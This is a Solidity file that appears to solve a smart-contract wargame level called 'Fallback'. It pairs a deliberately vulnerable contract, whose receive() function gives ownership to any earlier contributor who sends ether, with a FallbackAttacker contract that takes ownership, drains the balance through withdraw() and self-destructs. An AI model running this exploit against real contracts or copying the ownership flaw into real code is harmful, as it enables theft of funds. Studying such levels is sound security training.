// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
// import "hardhat/console.sol";

import "forge-std/console.sol";
contract Fallback {

  mapping(address => uint) public contributions;
  address public owner;

  constructor() {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }

  receive() external payable {
    // console.log("Fallback::receive()# called");
    require(msg.value > 0 && contributions[msg.sender] > 0);
    // console.log("Fallback::receive()# require passed");
    owner = msg.sender;
  }
}

contract FallbackAttacker{
  constructor(address payable target) payable {
    console.log("FallbackAttacker::constructor()# called ");
    Fallback(target).contribute{value:1 }();
    // console.log("FallbackAttacker::constructor()# contributions[msg.sender] ",Fallback(target).getContribution());
    target.call{value:1}("");
    Fallback(target).withdraw();
    selfdestruct(payable(msg.sender));
  }
}